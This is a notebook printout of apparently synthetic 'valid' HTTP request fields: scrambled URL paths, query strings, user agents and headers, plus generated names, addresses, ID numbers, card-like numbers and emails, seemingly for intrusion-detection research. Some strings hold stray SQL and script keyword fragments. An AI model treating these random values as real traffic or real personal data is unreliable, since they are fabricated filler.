#  {'pattern': '7fab=23xp9&ctf=w%aruaa8&aedz6xeihz=e-duiycc_7wt&tmgthsyhhdn=72845422&6hmeta52xqrx@k4=60&ylqc=sek9r]r:r)&ihenn=-1o&ostd=iyttnot8hnra&mym@=caroc&3da=aendlilrolsseto&ejrwofm=9649&mww169=chcw5xrwy&96pzhtpass75=030942263&rld=1799075&tnnove=e/e@y-sc(orshutdown',
#   'type': 'valid'},
#  {'pattern': 'ie=rrq&osm=lud&5ecsetuslmpw=0085&taraihrte=l&dcvbscriptzyw=985478&es=837965&ell6beia1in=hkppe&eiasobeep=5401883&tirc=t2s4vtjb&noorofs=3131&ttc6shivtbn4=gskfeeho',
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '/notieqaetdmhehhneh/iwtihekadgwfsqettiyw/eiwwkaft/_mn5hdeleteg/noedphpvl4exec2c/34mmvtlkb3p1o/m9giwmthysc.wtpwlut/wfftpzgy2/bxdymxfpj1p6o.php3',
#   'type': 'valid'},
#  {'pattern': 'eot-ierauwnl;q=0.0, rdtoasm-tas8elc;q=0.8, 0ta5cwa-mlaotoy;q=0.8, r2eerax-thioaoa',
#   'type': 'valid'},
#  {'pattern': '/th10jqdbpq/5rgry5betnhrne4/9fj4t/ymbx15b0mqwt-2usahw/nfk4p2u7fjnjpfm0/eatvhlmar8nrao0ovet/.vqpgvbw6f/rv.73_k.o/imtervwihu/gvg@qz2izvw95lzl/swn/eoasubjpq.dll',
#   'type': 'valid'},
#  {'pattern': 'mozilla/0.7 (windows; u; win 9x 2.7; iz-mn; rv:1.6.1) gecko/21127968',
#   'type': 'valid'},
#  {'pattern': "eatitee=tr'u&eixm2=978621500&eehui6yg8t=r0ot", 'type': 'valid'},
#  {'pattern': 'mozilla/9.2 (machintosh; u; ppc 4.7; ih-to; rv:2.7.0) gecko/17121334',
#   'type': 'valid'},
#  {'pattern': '/kceae/matene/nnnonx/u6w8odplp_sp3/pteneachsvtrtnoo6l/c3ff4seesfono/2ljwilef/ei5heiteuosdhrsaa/p0_vycs6flwlmlsfxx/um/r1cezqd0h@xob/dscriptg21pry.tiff',
#   'type': 'valid'},
#  {'pattern': '*;q=0.1', 'type': 'valid'},
#  {'pattern': '/isainenks6lresuampd/azhsier7ssa/4gsjre.aspx', 'type': 'valid'},
#  {'pattern': 'o21oemiane=9', 'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'nnshdsn8aaea9=teojg', 'type': 'valid'},
#  {'pattern': '/hjvw/enhlr1wwdhsolesdbap/wywp-95egsgroup by/vffmlbu2/auuicb2ikxd/ys/ik-vyytxh8qevlvh_/rcyl3mk6is/e6ybcmr6dkmqjbt4zr/rozzzmas.j_z/yd.png',
#   'type': 'valid'},
#  {'pattern': '/pslhe6honncmtwnssd9/thaoechtvai4t9wrlpsh/flb4ht/dfzkh4sgj1pklxl/ts7t/2k/0j3kuaca53chltwbdzqe/gbs/ole.gif',
#   'type': 'valid'},
#  {'pattern': 'zsvh=7&na=@owttmeta&ntptyebh=fj3p-h1np0sx&eia=)imtieit;aaa&ijtse7sioupa= vbscriptg&thgiapae4rgso=fsiysstulenores&oaz8se8drjt=iefaegoa&nuttuegirutj=317&sfhtsis=sl.rvs1b',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '/7m/n5ezebzuz/eismcdikokdsu/qwz6xtqjpqpu/6lnele22faincnisd.shtml',
#   'type': 'valid'},
#  {'pattern': '/opufpei2ibeut/vok3subhd96pojg@5a.css', 'type': 'valid'},
#  {'pattern': '/ehtheitsrv/b5mtoaosme/wio5y/c1vb.jsp', 'type': 'valid'},
#  {'pattern': 'ifcidon=4entpih', 'type': 'valid'},
#  {'pattern': 'neqstherarmrsr=oiklaiur', 'type': 'valid'},
#  {'pattern': 'uow9=wooni&cs=ol6e&ht3ltr=4ntmpg&tdnon8tags=jse',
#   'type': 'valid'},
#  {'pattern': 'gme17euf3=@cqhttpsi aeetma|iito&iavelv=231&bltce5iensht7it=55jg07h&lbh=onieernaqeb5wtwhpr&oqtpjtsl@0av=i: ri&znrefioarow=cien8m&hohdie=@&pu8zuy=2956112522&grecrdahmetansg=mhomevaytl n&utitetstaf=9024357&xjhxusystem=lbs&ineh=rrsotjyrosmsvl&da2eothaegu=@',
#   'type': 'valid'},
#  {'pattern': '/yidnbo/o4c7@jspv_tfz.gif', 'type': 'valid'},
#  {'pattern': "foxodf=zervdrsol&rkserwoxnshe=ocrei&ansdelrrelhd=sia's|(u",
#   'type': 'valid'},
#  {'pattern': 'mozilla/7.1 (x11; u; sunos sun4u 3.5; bg-to; rv:5.6.6) gecko/52751847',
#   'type': 'valid'},
#  {'pattern': '/uhg5r005ctrjk/docandns3nf8.shtml', 'type': 'valid'},
#  {'pattern': '/m3iiiai2foes/gjt1v3/edwbopzuamnejt/tatnso1gdlk/inhnuohfun.kjt.php4',
#   'type': 'valid'},
#  {'pattern': '/ntejfk/e2exmz8awv_t/t60yk@7/behytieqees6ejufx6re/eserybopbtfasee3ossa/lougzqlgptk6gj/ryynuwa/ex.jnkcee4utz0/a5wau5ag8v0vf.pl',
#   'type': 'valid'},
#  {'pattern': '/xit75ddenw/sp.h4yfixekdswpr/ley2sonfa/pz0jebmwpifdg72/s9nobirlds0iaigc3n/hzpvf7c.htm',
#   'type': 'valid'},
#  {'pattern': 'anyihgkswhvaen=56087&raa9enl=[t14&body1iconnect26=39529502&rosh=toptes(9imhttps<de7es/ e&ftzvcnszbibtg=nem&tlia5oapa=merydss7irgia&tltd@nullor=e&r8ofi5mraesnnrn=onbsytwrhnair0&wawuhzrieenetwt=247556&0n5wjwnsa=824150',
#   'type': 'valid'},
#  {'pattern': '/abr/iky/1di8/wheu.@vw4zrxdspxdh/u5k-uuaposition_qdmt/0tkh1y@simu-ug3ujgrv/en.u97zc/t1xpvb2snnwu/pl83qts2w/vgw/mmsoeekrhhneu/h9n2ju_.jpg',
#   'type': 'valid'},
#  {'pattern': 'mozilla/8.4 (compatible; bowdi; win98; syrtt)', 'type': 'valid'},
#  {'pattern': '/eib4oq_/syr3ofods/vpfwtcaxotwx_2v/a0athqfe.hj/snwavlib@hy-50rw/fsapigapkeit/ukt/1fb-jvb/iy4bldwc0c@-oswx/btp.gif',
#   'type': 'valid'},
#  {'pattern': 'ibuhqeis=einsertevilxb8h|nem', 'type': 'valid'},
#  {'pattern': 'compress, compress;q=0.8, identity;q=0.0, identity, compress;q=0.2',
#   'type': 'valid'},
#  {'pattern': 'asohodmta=adl6abulr1nd/&le0nesregad=8uu9dpew&pa5piaukc=0&uheihsrnlre=330894&zkye=rdem0selectenh<d(a&oe8aue=octrtikwntf0wr&bgnmlsma=nzinhrerjool',
#   'type': 'valid'},
#  {'pattern': 'ddtegamtsa=np6&onwdutmf1jl=lldir0a', 'type': 'valid'},
#  {'pattern': '/w36e2xxao09nv/u0dscsrqynlx9_-ckj/bnv.maztlfqbgvu/tvjs7x2zs_x.mspx',
#   'type': 'valid'},
#  {'pattern': '/hc/ue/vipnye1vet1rsna2aseo/iswm_rp9/56xemya2re2f/9ipbhletzua.asmx',
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': "vlez=901&hiperyycufqd=hhua&tacehds=644&@kmchildpqba.=18027&esdtun6esf2s=deetse2tcrirens&whub=07380225&lovautyev=tsaesesouseeet&redzepikaa=w nhrmif1httpo i(a&srswzu3wc='mtideoydlgts9s&n4cvp=h5wdhb5n&pfohttps7yot9=@hhzo&dbpenrntrwseeot=mmswxtian",
#   'type': 'valid'},
#  {'pattern': 'f5npasa5=bli@access_lognopeaglc;trtmkct=-s', 'type': 'valid'},
#  {'pattern': 'f5npasa5=bli@access_lognopeaglc;trtmkct=-s', 'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'q2sq0n=u0ao&uycl-li04opm=i1dohwosa&nartlr=shttpsock_streamandahtaccesfbey p4aw&kod9lvxml9r=o9aitme9njotor&enbvtm=tz s& nt0a&d90itq3ctscr=inua3$e&o2ooanav5esnith=7a en[r',
#   'type': 'valid'},
#  {'pattern': 'lnare-unaad', 'type': 'valid'},
#  {'pattern': '/ayrar5hmoour/edp2_9sg8h0/ayobee8n4njoea/0c_bhyi9zr1hqmfx/tneatiiaknlini/m.meyvgag5@rr6/5_vperl.dll',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'ttasrisntotcnle=0822260', 'type': 'valid'},
#  {'pattern': "escripthtaccesss=85&ubb_xss-u@b2=4572438&e4ttrneeeu=oo3y'unvv4nid&5nkqnph-c=sgid0alry4eiajta&twvtu0so6e=d6cyej835x8&stoaoeudditmnuk=033&mnsb=02&akuhitc=i32>s@p%uaobin&techozvg=4&tdo8baeouoe=y5&binput.input6j-=3gm6-hnek&z5uk@r=rsyiein",
#   'type': 'valid'},
#  {'pattern': 'identity;q=0.6', 'type': 'valid'},
#  {'pattern': 'hy2i-eie;q=0.3, t-htev, meoc-ffguca;q=0.4', 'type': 'valid'},
#  {'pattern': '/whc@.htm', 'type': 'valid'},
#  {'pattern': '/emfnykstl_piwkrq/ie/qladminygvishutdown7ml/-c7locationzmocha3bodyetc8h/tw9ptntrre0tmw/hastlh3hnidmlt.css',
#   'type': 'valid'},
#  {'pattern': '/isowrjxsj/ch/5v5eogqopenbjlp4/.scrpcat1fw.html',
#   'type': 'valid'},
#  {'pattern': 'mozilla/3.0 (compatible; msie 7.8; mac os x; iqfk3ee6; rljenrhr; grftsftni2)',
#   'type': 'valid'},
#  {'pattern': '/tlqky5/rditfhi/o1zq4y3/nafoexs4etf/2u@slequ-xfhglex1hc/ovvlg.php',
#   'type': 'valid'},
#  {'pattern': '/e4r4uhiea1eb/ea2resfpiebzt1/cebobtatueeg90enrm/an/snasildsljhes2/llennbilmo7sutoidl/o0sxafysupu5.gif',
#   'type': 'valid'},
#  {'pattern': 'fncmdh=otat&usbpdhkseidb=en5tiii&ayaet=swp&-wh.=mvnkkvdnnkz&ibtloere=ekceao-l&jdqr=95&t9s=a9e&ye=8310815',
#   'type': 'valid'},
#  {'pattern': '/6e/coshoardieaerte/0s2fo7cpt08z7kqern/u@xdlvvrqwxt82f9w/tywkpg/hvncl3hqu5pa3n8i2nb/6ouilxiv1/lkutetyeb6acceptuoqm.mdb',
#   'type': 'valid'},
#  {'pattern': '/n6f_umbclbtw/m_q@zb2iynrh/vyau49lza/demb3rnemoonion/v7ouwgetk/ga0ehpp_lb1jm9kn3/z6fx0wwp/u1opbsz.jpg',
#   'type': 'valid'},
#  {'pattern': '/tanb1ay6aeigm/tdjkv.vrh8j7fpuykl/sheildncnfarse/rqirhftpjzwl_fbwlk/aeiahstd/oosohlhtsbosb.msf',
#   'type': 'valid'},
#  {'pattern': 'ytc2tpuzcj=bce&cdeoatbtedokhof=x@fvifswr&9oea4ehfextkdx=hbiamea&vcrstejdcter=950&lvhdte7s=87467&shol= aocor&utyued9eb=d?havinghy&mlc=sgkskvzrkron&nbtslnnow4=exo&tddededloiao=fydrtrer&hfbgffz6usr.44=jprocessing-instruction%shrcpprocessing-instruction m/0e',
#   'type': 'valid'},
#  {'pattern': '/4of4ruostuharcjblbvr/oq5ashiuh4xnye/5dyiqv.shtml',
#   'type': 'valid'},
#  {'pattern': 'ekge3f-dt;q=0.5, oeg-quses;q=0.7', 'type': 'valid'},
#  {'pattern': '/wlcnt2nrc5qodim3ta.msf', 'type': 'valid'},
#  {'pattern': '/en/qwxjepwtawne0eraew/n@w/pdroplxg/detisuaita/hmwwite2x0@/1iu9edc/t9blusfnxr9tzjvbfq/2qll8jua37rgwzn1/ekw_nd.jpeg',
#   'type': 'valid'},
#  {'pattern': 'vo9ms1 http://www.dtsnlo0o.fr', 'type': 'valid'},
#  {'pattern': 'tsddsuotr2rise=169385&a0tns8eeera=odijy&t3seuoei97=839397&hc4esn=te5o&revj=js1lh sb&snmtpt=aex_kff19lf.',
#   'type': 'valid'},
#  {'pattern': 'ndaxhaouletnecynme', 'type': 'valid'},
#  {'pattern': '/l3k5uag1/ttlncdbi/gtmperauqam-ke8y.png', 'type': 'valid'},
#  {'pattern': '/exajfppkjmjc1yb7/mdtovgcyuo/uq6i4os3/58dtzotehtsyiwek47cb/pcqx5zxrpuq_qvmixkp/dj11vyandovadr0/boir9noiels1s/p2ld/ejwi3u.asmx',
#   'type': 'valid'},
#  {'pattern': '/n60qg_zd.lg0/h5ux9oqdedej2d/scxzcl-k4.php3', 'type': 'valid'},
#  {'pattern': '/i8t0o@c9suui_tlmbdyy/blsgbmh/select1vetiqxymdchttp.html',
#   'type': 'valid'},
#  {'pattern': '/bataiefre3dnlv/dvzoaccess_loglfov/sl/sqot0_4/mmu1mz/eydehbermief/i@_yrvyjbcezummg1/gwcg_pgd7qgli_/ot3n/euz/rzwvla9zaevcqlrf1v.nsf',
#   'type': 'valid'},
#  {'pattern': '/ekzrnevvkrr.5q/rcsjidieeinrestsm/iafcme2hthhsteodohnb/tz1r/wj7/csct-7z5zdjc./61u0apve_v21g/eosfreoedhwtitht1e5/awxq59wmsqc7f86dn/esrfr3eilcqmaatrvtd/ieoeioqn.css',
#   'type': 'valid'},
#  {'pattern': '/miso/lmgtodew@/lhtlssyihe/lw/xcwherettyk/e.pihcdsthuytuoh6lv/cseptbshr/inlhdxkx98ps9bf/cjuga1chuecorte/tszdidsthepidn/rhbtarrtiv/71itkc.nsf',
#   'type': 'valid'},
#  {'pattern': '/b0/orbmbeslsdft3imziidw.png', 'type': 'valid'},
#  {'pattern': '/obkb4tmpnyhaving/bt6lihp7e9lant/ubmigz/olrhnteamud/equ/05ssesr5kwn/65dyiialpedatontlae/positionh/xs/1ssgatcp/8al9twd1ztjgzs1nq.gif',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'nglhcta-ofgmo, 2odqudm-98uis2n3;q=0.2, meeiyc-svldt;q=0.4',
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '/uhnuroniu/pd9b3sgg_/8stsqyjf7tth1lp/imit0olim0nbexjm8f/dselectj@3skapxro.asmx',
#   'type': 'valid'},
#  {'pattern': '/gu5abdktr/9ygopenslseiy7u01k/yp/8hvircz2rt6fvb9c/ltt.dll',
#   'type': 'valid'},
#  ...]

# %%
custom
# Out:
# [{'pattern': 'c/ caridad s/n', 'type': 'valid'},
#  {'pattern': 'campello, el', 'type': 'valid'},
#  {'pattern': '1442431887503330', 'type': 'valid'},
#  {'pattern': 'nue37', 'type': 'valid'},
#  {'pattern': 'tufts3@joll.rs', 'type': 'valid'},
#  {'pattern': '22997112x', 'type': 'valid'},
#  {'pattern': 'arenas de san juan', 'type': 'valid'},
#  {'pattern': '19245', 'type': 'valid'},
#  {'pattern': 'fennell', 'type': 'valid'},
#  {'pattern': 'd50allecido', 'type': 'valid'},
#  {'pattern': 'genny', 'type': 'valid'},
#  {'pattern': '03248i367ca', 'type': 'valid'},
#  {'pattern': 'grubel8@albeiteria.kw', 'type': 'valid'},
#  {'pattern': '83497200r', 'type': 'valid'},
#  {'pattern': 'martn de yeltes', 'type': 'valid'},
#  {'pattern': '1769471856078209', 'type': 'valid'},
#  {'pattern': 'cascabela', 'type': 'valid'},
#  {'pattern': 'ludolfo', 'type': 'valid'},
#  {'pattern': 'snerd@bwds.tj', 'type': 'valid'},
#  {'pattern': '15365381r', 'type': 'valid'},
#  {'pattern': 'regueras de arriba', 'type': 'valid'},
#  {'pattern': '08281', 'type': 'valid'},
#  {'pattern': '7497', 'type': 'valid'},
#  {'pattern': 'mckenney', 'type': 'valid'},
#  {'pattern': 'poma gozalbo', 'type': 'valid'},
#  {'pattern': 'loti@ajuntamentbarcelona2-0.is', 'type': 'valid'},
#  {'pattern': 'c/ huertas altas, 114', 'type': 'valid'},
#  {'pattern': 'sequera de haza, la', 'type': 'valid'},
#  {'pattern': '8755728520539974', 'type': 'valid'},
#  {'pattern': 'kindra', 'type': 'valid'},
#  {'pattern': 'josias', 'type': 'valid'},
#  {'pattern': 'fonoll zurko', 'type': 'valid'},
#  {'pattern': '07408152j', 'type': 'valid'},
#  {'pattern': 'c/ aira de villaescusa 199, 1f', 'type': 'valid'},
#  {'pattern': '09530', 'type': 'valid'},
#  {'pattern': '4190369223587522', 'type': 'valid'},
#  {'pattern': '5x8r0r', 'type': 'valid'},
#  {'pattern': '5599', 'type': 'valid'},
#  {'pattern': 'indocto', 'type': 'valid'},
#  {'pattern': 'serneo', 'type': 'valid'},
#  {'pattern': 'marieau8@clementelr.nz', 'type': 'valid'},
#  {'pattern': '24314757p', 'type': 'valid'},
#  {'pattern': '04742', 'type': 'valid'},
#  {'pattern': '3363230401310436', 'type': 'valid'},
#  {'pattern': 'correccionalmente', 'type': 'valid'},
#  {'pattern': 'cleofs', 'type': 'valid'},
#  {'pattern': 'europa, 58 2-f', 'type': 'valid'},
#  {'pattern': '21388', 'type': 'valid'},
#  {'pattern': 'vasilopo', 'type': 'valid'},
#  {'pattern': 'ladronzue_lo', 'type': 'valid'},
#  {'pattern': 'elbeze', 'type': 'valid'},
#  {'pattern': 'cachapera', 'type': 'valid'},
#  {'pattern': 'hibbert.bupp@hojadecalculo.com.mil', 'type': 'valid'},
#  {'pattern': '56163821y', 'type': 'valid'},
#  {'pattern': 'zarratn', 'type': 'valid'},
#  {'pattern': '6341227779092516', 'type': 'valid'},
#  {'pattern': 'er3t3e1', 'type': 'valid'},
#  {'pattern': 'atanaspulos', 'type': 'valid'},
#  {'pattern': '38355013y', 'type': 'valid'},
#  {'pattern': 'plaa catalunya 124, 5-b', 'type': 'valid'},
#  {'pattern': '19312', 'type': 'valid'},
#  {'pattern': '1437589782727245', 'type': 'valid'},
#  {'pattern': 'cuatriduana', 'type': 'valid'},
#  {'pattern': '1565', 'type': 'valid'},
#  {'pattern': 'ti7o', 'type': 'valid'},
#  {'pattern': 'folch pintado', 'type': 'valid'},
#  {'pattern': '00474767r', 'type': 'valid'},
#  {'pattern': 'manuel pereira s/n 12?a', 'type': 'valid'},
#  {'pattern': 'esther', 'type': 'valid'},
#  {'pattern': 'labranto', 'type': 'valid'},
#  {'pattern': 'pelez bastus', 'type': 'valid'},
#  {'pattern': 'pianka@noviasteresapalacios.mc', 'type': 'valid'},
#  {'pattern': 'c/ doctor ferran, 193', 'type': 'valid'},
#  {'pattern': '38787', 'type': 'valid'},
#  {'pattern': 'fitzgera', 'type': 'valid'},
#  {'pattern': '13g0e7at42a', 'type': 'valid'},
#  {'pattern': 'kinnie', 'type': 'valid'},
#  {'pattern': 'ret4ne3or', 'type': 'valid'},
#  {'pattern': 'vettenranta@infopromo.az', 'type': 'valid'},
#  {'pattern': 'el caaveral 130, 5-f', 'type': 'valid'},
#  {'pattern': '9139561296743472', 'type': 'valid'},
#  {'pattern': 'valina', 'type': 'valid'},
#  {'pattern': 'yoselie', 'type': 'valid'},
#  {'pattern': 'pool echenique', 'type': 'valid'},
#  {'pattern': 'calle holanda 146,', 'type': 'valid'},
#  {'pattern': 'tres villas, las', 'type': 'valid'},
#  {'pattern': '5426744631176158', 'type': 'valid'},
#  {'pattern': 'patrica0', 'type': 'valid'},
#  {'pattern': 'mankowsk', 'type': 'valid'},
#  {'pattern': '4a39c44a', 'type': 'valid'},
#  {'pattern': 'bow@whitepearlresort.pl', 'type': 'valid'},
#  {'pattern': '01472954b', 'type': 'valid'},
#  {'pattern': 'adradas', 'type': 'valid'},
#  {'pattern': '18417', 'type': 'valid'},
#  {'pattern': 'smelters', 'type': 'valid'},
#  {'pattern': 'tamboreo', 'type': 'valid'},
#  {'pattern': 'lamas', 'type': 'valid'},
#  {'pattern': 'sipperly.nakamoto@ceramicasmio.ht', 'type': 'valid'},
#  {'pattern': 'carretera 200 hasta km. 1 barra de mio 175', 'type': 'valid'},
#  {'pattern': 'manzanilla', 'type': 'valid'},
#  {'pattern': '1181707541494323', 'type': 'valid'},
#  {'pattern': 'jalaie', 'type': 'valid'},
#  {'pattern': '1613', 'type': 'valid'},
#  {'pattern': 'joelly', 'type': 'valid'},
#  {'pattern': 'flaviano', 'type': 'valid'},
#  {'pattern': 'oshea_knowles@tiaherminia.gh', 'type': 'valid'},
#  {'pattern': 'calle del llenguadoc s/n, 6e', 'type': 'valid'},
#  {'pattern': 'pujalt', 'type': 'valid'},
#  {'pattern': '0269447503610316', 'type': 'valid'},
#  {'pattern': 'kristel', 'type': 'valid'},
#  {'pattern': 'reiji', 'type': 'valid'},
#  {'pattern': 'estolano boget', 'type': 'valid'},
#  {'pattern': '62145911a', 'type': 'valid'},
#  {'pattern': 'travesia barrionuevo, 49', 'type': 'valid'},
#  {'pattern': '7738690201675696', 'type': 'valid'},
#  {'pattern': 'daisey', 'type': 'valid'},
#  {'pattern': '2925', 'type': 'valid'},
#  {'pattern': 'doris', 'type': 'valid'},
#  {'pattern': 'bergad faix', 'type': 'valid'},
#  {'pattern': 'sibirskaia@euskalcasino.es', 'type': 'valid'},
#  {'pattern': 'c/ lope de rueda s/n, 9-f', 'type': 'valid'},
#  {'pattern': 'alcntar', 'type': 'valid'},
#  {'pattern': 'lozier', 'type': 'valid'},
#  {'pattern': 'alguese', 'type': 'valid'},
#  {'pattern': '30482828p', 'type': 'valid'},
#  {'pattern': 'c/ ulises 17,', 'type': 'valid'},
#  {'pattern': 'rube', 'type': 'valid'},
#  {'pattern': 'enlutada', 'type': 'valid'},
#  {'pattern': 'blount', 'type': 'valid'},
#  {'pattern': 'sugesto', 'type': 'valid'},
#  {'pattern': 'suau', 'type': 'valid'},
#  {'pattern': 'germain@elcorteitaliano.cat', 'type': 'valid'},
#  {'pattern': 'c/ de la sabina, s/n 8?b', 'type': 'valid'},
#  {'pattern': 'betelu', 'type': 'valid'},
#  {'pattern': 'mcglynn', 'type': 'valid'},
#  {'pattern': 'midkiff_mikuni@directoriogratuito.kh', 'type': 'valid'},
#  {'pattern': 'calle rascafria, 103,', 'type': 'valid'},
#  {'pattern': 'gimialcn', 'type': 'valid'},
#  {'pattern': '3582197540300309', 'type': 'valid'},
#  {'pattern': 'sprouse', 'type': 'valid'},
#  {'pattern': '1827', 'type': 'valid'},
#  {'pattern': 'addons', 'type': 'valid'},
#  {'pattern': 'karla', 'type': 'valid'},
#  {'pattern': 'jauregui cortines', 'type': 'valid'},
#  {'pattern': '86800649y', 'type': 'valid'},
#  {'pattern': 'paratge lila 30, 10?c', 'type': 'valid'},
#  {'pattern': '9091453994786923', 'type': 'valid'},
#  {'pattern': 'dyck', 'type': 'valid'},
#  {'pattern': 'pereda barrio', 'type': 'valid'},
#  {'pattern': 'barrymore@hipermadrid.pe', 'type': 'valid'},
#  {'pattern': 'doctor waksmann, 120, 7?b', 'type': 'valid'},
#  {'pattern': 'caudete', 'type': 'valid'},
#  {'pattern': '3161746053397457', 'type': 'valid'},
#  {'pattern': 'chao', 'type': 'valid'},
#  {'pattern': '4403', 'type': 'valid'},
#  {'pattern': 'patacki', 'type': 'valid'},
#  {'pattern': 'xifr', 'type': 'valid'},
#  {'pattern': 'pleasande@doloresmusculares.aq', 'type': 'valid'},
#  {'pattern': 'sanchez 49,', 'type': 'valid'},
#  {'pattern': '9008082484622624', 'type': 'valid'},
#  {'pattern': 'o bispar', 'type': 'valid'},
#  {'pattern': 'adgardo', 'type': 'valid'},
#  {'pattern': '36914497a', 'type': 'valid'},
#  {'pattern': 'nucleo santiago apostol 34, 4?f', 'type': 'valid'},
#  {'pattern': '20491', 'type': 'valid'},
#  {'pattern': '4811716935763521', 'type': 'valid'},
#  {'pattern': 'inord2n6da7e401', 'type': 'valid'},
#  {'pattern': '5445', 'type': 'valid'},
#  {'pattern': 'a65esad0', 'type': 'valid'},
#  {'pattern': 'efrn', 'type': 'valid'},
#  {'pattern': 'calle castaos 90', 'type': 'valid'},
#  {'pattern': 'torre-cardela', 'type': 'valid'},
#  {'pattern': '4867284155125635', 'type': 'valid'},
#  {'pattern': 'oran', 'type': 'valid'},
#  {'pattern': 'tesisteco avi', 'type': 'valid'},
#  {'pattern': 'pepet@naturalchild.co', 'type': 'valid'},
#  {'pattern': '01308', 'type': 'valid'},
#  {'pattern': '6702564951251728', 'type': 'valid'},
#  {'pattern': 'remante', 'type': 'valid'},
#  {'pattern': '919', 'type': 'valid'},
#  {'pattern': 'afoscarse', 'type': 'valid'},
#  {'pattern': 'net.valdez@salaparis.gt', 'type': 'valid'},
#  {'pattern': 'c/ja del indiano, s/n,', 'type': 'valid'},
#  {'pattern': 'illano', 'type': 'valid'},
#  {'pattern': '2872946473881757', 'type': 'valid'},
#  {'pattern': 'spears', 'type': 'valid'},
#  {'pattern': 'triana', 'type': 'valid'},
#  {'pattern': 'del ngel kercad', 'type': 'valid'},
#  {'pattern': '10421521z', 'type': 'valid'},
#  {'pattern': 'etorbidea askatasuna 170, 8?a', 'type': 'valid'},
#  {'pattern': '2754013363983769', 'type': 'valid'},
#  {'pattern': 'huong', 'type': 'valid'},
#  {'pattern': '1729', 'type': 'valid'},
#  {'pattern': 'tse', 'type': 'valid'},
#  {'pattern': 'victoria de los angeles', 'type': 'valid'},
#  {'pattern': 'ventura motn', 'type': 'valid'},
#  {'pattern': 'roure, 43, 3?d', 'type': 'valid'},
#  {'pattern': '32648', 'type': 'valid'},
#  {'pattern': 'meggy', 'type': 'valid'},
#  {'pattern': '3o22ciabl3', 'type': 'valid'},
#  {'pattern': 'ayat rozas', 'type': 'valid'},
#  {'pattern': 'verani@viajesdacapalla.gq', 'type': 'valid'},
#  {'pattern': 'quinita flores 75,', 'type': 'valid'},
#  {'pattern': 'botarell', 'type': 'valid'},
#  {'pattern': '3893864101962581', 'type': 'valid'},
#  {'pattern': 'etchieso', 'type': 'valid'},
#  {'pattern': '9159', 'type': 'valid'},
#  {'pattern': 'marieann', 'type': 'valid'},
#  {'pattern': 'penarroya ingla', 'type': 'valid'},
#  {'pattern': 'gayle@freetag.name', 'type': 'valid'},
#  {'pattern': 'el halcon 154, 8?f', 'type': 'valid'},
#  {'pattern': '03314', 'type': 'valid'},
#  {'pattern': 'evin', 'type': 'valid'},
#  {'pattern': 'sa6r2', 'type': 'valid'},
#  {'pattern': 'gorcy.davis@carmensanmartin.bo', 'type': 'valid'},
#  {'pattern': '16601924h', 'type': 'valid'},
#  {'pattern': 'destriana', 'type': 'valid'},
#  {'pattern': '25307', 'type': 'valid'},
#  {'pattern': '9639', 'type': 'valid'},
#  {'pattern': 'longo', 'type': 'valid'},
#  {'pattern': 'armero filippi', 'type': 'valid'},
#  {'pattern': 'uzaki@23horas.ie', 'type': 'valid'},
#  {'pattern': '24391', 'type': 'valid'},
#  {'pattern': 'lei-see', 'type': 'valid'},
#  {'pattern': 'rahue', 'type': 'valid'},
#  {'pattern': 'serna kovac', 'type': 'valid'},
#  {'pattern': '51795949h', 'type': 'valid'},
#  {'pattern': 'calle del derecho 17,', 'type': 'valid'},
#  {'pattern': '50693', 'type': 'valid'},
#  {'pattern': '9473535060757439', 'type': 'valid'},
#  {'pattern': '7a2a6t1ro', 'type': 'valid'},
#  {'pattern': '1858', 'type': 'valid'},
#  {'pattern': 'pavorde', 'type': 'valid'},
#  {'pattern': 'elois', 'type': 'valid'},
#  {'pattern': 'terrio@likeanangel.dz', 'type': 'valid'},
#  {'pattern': '46773841y', 'type': 'valid'},
#  {'pattern': 'arndiga', 'type': 'valid'},
#  {'pattern': '8554607392278464', 'type': 'valid'},
#  {'pattern': 'muntaner nevado', 'type': 'valid'},
#  {'pattern': 'vasilescu.lisi@drogasvirtuales.sc', 'type': 'valid'},
#  {'pattern': 'luis braille, 33, 12?d', 'type': 'valid'},
#  {'pattern': 'matar', 'type': 'valid'},
#  {'pattern': '4608056297024601', 'type': 'valid'},
#  {'pattern': 'werling', 'type': 'valid'},
#  {'pattern': '7012', 'type': 'valid'},
#  {'pattern': 'barnhill', 'type': 'valid'},
#  {'pattern': 'quintilio', 'type': 'valid'},
#  {'pattern': 'naharro', 'type': 'valid'},
#  {'pattern': '38980059g', 'type': 'valid'},
#  {'pattern': 'calle isis, 180', 'type': 'valid'},
#  {'pattern': '6172398321911966', 'type': 'valid'},
#  {'pattern': 'janeva', 'type': 'valid'},
#  {'pattern': 'lzaro', 'type': 'valid'},
#  {'pattern': 'hinwood-laretei@addl.es', 'type': 'valid'},
#  {'pattern': 'canfranc', 'type': 'valid'},
#  {'pattern': '26323', 'type': 'valid'},
#  {'pattern': 'radioelctrica', 'type': 'valid'},
#  {'pattern': '3679', 'type': 'valid'},
#  {'pattern': 'apotrerar', 'type': 'valid'},
#  {'pattern': 'mochn quer', 'type': 'valid'},
#  {'pattern': '30503437d', 'type': 'valid'},
#  {'pattern': 'carrer asturies, 49', 'type': 'valid'},
#  {'pattern': '8582534834926521', 'type': 'valid'},
#  {'pattern': 'aghili', 'type': 'valid'},
#  {'pattern': 'colunga corrius', 'type': 'valid'},
#  {'pattern': 'bukoontot@google-movil.cm', 'type': 'valid'},
#  {'pattern': 'c/ asuncion 115 5e', 'type': 'valid'},
#  {'pattern': 'almonacid de la sierra', 'type': 'valid'},
#  {'pattern': 'rorke', 'type': 'valid'},
#  {'pattern': '3u23pe', 'type': 'valid'},
#  {'pattern': 'philippa', 'type': 'valid'},
#  {'pattern': 'carroar', 'type': 'valid'},
#  {'pattern': 'schwab.carli@emepleo.info', 'type': 'valid'},
#  {'pattern': 'calle batalla de muhlberg, 25, 6?a', 'type': 'valid'},
#  {'pattern': '27860', 'type': 'valid'},
#  {'pattern': 'brenda', 'type': 'valid'},
#  {'pattern': 'alpar-ornstein@rockefeller.nu', 'type': 'valid'},
